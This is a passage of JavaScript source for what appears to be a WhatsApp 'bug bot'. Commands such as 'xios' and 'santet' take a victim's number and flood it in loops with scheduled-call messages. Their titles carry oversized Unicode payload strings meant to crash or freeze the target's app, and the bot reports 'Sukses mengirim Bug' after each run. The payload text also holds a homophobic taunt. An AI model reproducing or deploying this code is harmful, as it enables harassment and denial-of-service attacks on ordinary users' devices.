konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
}
zetsreply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
}
break
case 'xios' : case 'unlipending' : {
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
Pe = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "3"
konsol = async (teks) => {
let schedule = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO",
"scheduledTimestampMs": 0,
"title": teks, 
}
}), { userJid: from, quoted: kalgans })
zetsubo.relayMessage(Pe, schedule.message, { messageId: schedule.key.id })
	}
for (let i = 0; i < jumlah; i++) {
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
konsol(`༑[Is Not Delay Maker😆${ios2}${ios1}.${mdelay}`)
await sleep(1000) 
}
zetsreply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
}
break
case 'santet' : case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '🌿': case '🍀': case 'unlipending': case 'unliattention': case 'unlinegro': case 'unlischedule': case 'xandro': case 'xsistem': case 'xschedule': case '++schedule': case 'scheduleobject': case 'scheduleobject': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
Pe = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "3"
attention = async (teks) => {
let schedule = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO",
"scheduledTimestampMs": 0,
"title": teks, 
}
}), { userJid: from, quoted: kalgans })
zetsubo.relayMessage(Pe, schedule.message, { messageId: schedule.key.id })
	}
for (let i = 0; i < jumlah; i++) {
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘgay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ𝐗 gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘgay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘgay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ𝐗 gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ𝐗 gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕͟𝐘𝐆 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕𝚺𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘgay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
